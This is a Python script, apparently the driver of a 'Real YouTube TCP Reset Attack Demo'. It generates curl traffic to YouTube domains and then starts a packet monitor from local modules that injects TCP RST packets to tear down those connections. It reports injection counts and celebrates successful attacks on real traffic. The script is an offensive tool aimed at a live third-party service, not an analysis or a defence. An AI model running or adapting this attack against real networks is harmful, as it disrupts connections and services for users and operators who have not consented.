#!/usr/bin/env python3
"""
Real YouTube Attack Demo
Generate real YouTube traffic and attack it
"""

import subprocess
import threading
import time
import sys
import os
from pathlib import Path

def generate_youtube_traffic():
    """Generate continuous traffic to YouTube"""
    print("[TRAFFIC] Starting YouTube traffic generation...")
    
    def traffic_loop():
        youtube_urls = [
            "https://www.youtube.com/",
            "https://www.youtube.com/feed/trending",
            "https://www.youtube.com/results?search_query=test",
            "https://ytimg.com/",
            "https://googlevideo.com/"
        ]
        
        for i in range(60):  # Run for 60 iterations
            try:
                url = youtube_urls[i % len(youtube_urls)]
                subprocess.run([
                    'curl', '-s', '-o', '/dev/null', '--max-time', '5', url
                ], timeout=10)
                print(f"[TRAFFIC] Generated request {i+1}/60 to {url}")
                time.sleep(2)
            except:
                pass
    
    thread = threading.Thread(target=traffic_loop, daemon=True)
    thread.start()
    return thread

def run_attack_on_youtube_traffic():
    """Run the TCP reset attack targeting YouTube traffic"""
    print("[ATTACK] Starting YouTube TCP Reset Attack...")
    
    # Add src to path
    sys.path.insert(0, str(Path(__file__).parent / "src"))
    
    try:
        from config_manager import ConfigManager
        from packet_monitor import PacketMonitor
        
        # Use current config (already set to our IP)
        config = ConfigManager()
        
        target_ip = config.get('NETWORK', 'TARGET_IP')
        interface = config.get('NETWORK', 'INTERFACE')
        
        print(f"[ATTACK] Target IP: {target_ip}")
        print(f"[ATTACK] Interface: {interface}")
        
        # Create packet monitor  
        monitor = PacketMonitor(target_ip, interface, config)
        
        # Start monitoring
        if monitor.start_monitoring():
            print("\n" + "=" * 50)
            print("🎯 REAL YOUTUBE ATTACK ACTIVE")
            print("=" * 50)
            print("Monitoring real YouTube traffic!")
            print("Press Ctrl+C to stop")
            print("=" * 50)
            return monitor
        else:
            print("[ATTACK] Failed to start monitoring")
            return None
            
    except Exception as e:
        print(f"[ATTACK] Error: {e}")
        import traceback
        traceback.print_exc()
        return None

def main():
    """Main demo function"""
    if os.geteuid() != 0:
        print("This demo requires root privileges for packet capture")
        print("Run: sudo python3 real_youtube_demo.py")
        return
    
    print("=" * 60)
    print("REAL YOUTUBE TCP RESET ATTACK DEMO")
    print("=" * 60)
    print("This will:")
    print("1. Generate real traffic to YouTube servers")
    print("2. Monitor and attack that traffic with TCP RST")
    print("3. Show attack effectiveness on real YouTube traffic")
    print()
    
    input("Press Enter to start the demo...")
    
    # Start YouTube traffic generation
    traffic_thread = generate_youtube_traffic()
    time.sleep(5)  # Let traffic start
    
    # Start the attack
    monitor = run_attack_on_youtube_traffic()
    
    if monitor:
        try:
            # Run for 2 minutes
            start_time = time.time()
            while time.time() - start_time < 120:
                time.sleep(10)
                
                # Print stats every 10 seconds
                stats = monitor.rst_injector.get_statistics()
                elapsed = int(time.time() - start_time)
                print(f"\n[STATS] {elapsed}s | Packets: {monitor.packet_count} | "
                      f"YouTube: {monitor.youtube_packet_count} | "
                      f"RST: {stats['total_injections']}")
                
                if stats['total_injections'] > 0:
                    print("🎉 SUCCESS! Attacking real YouTube traffic!")
        
        except KeyboardInterrupt:
            print("\n[DEMO] Stopped by user")
        
        # Stop monitoring
        monitor.stop_monitoring()
        
        # Final results
        print("\n" + "=" * 50)
        print("REAL YOUTUBE ATTACK RESULTS")
        print("=" * 50)
        stats = monitor.rst_injector.get_statistics()
        print(f"Total packets monitored: {monitor.packet_count}")
        print(f"YouTube packets detected: {monitor.youtube_packet_count}")
        print(f"RST packets injected: {stats['total_injections']}")
        print(f"Connections attacked: {stats['connections_attacked']}")
        
        if stats['total_injections'] > 0:
            print("\n✅ REAL YOUTUBE ATTACK SUCCESSFUL!")
            print("Successfully attacked real YouTube traffic!")
        elif monitor.youtube_packet_count > 0:
            print("\n⚠️ YouTube traffic detected but not attacked")
            print("May need to adjust detection parameters")
        else:
            print("\n❌ No YouTube traffic detected")
            print("Traffic may be using different patterns")
    
    print("\n[DEMO] Demo completed!")

if __name__ == "__main__":
    main()
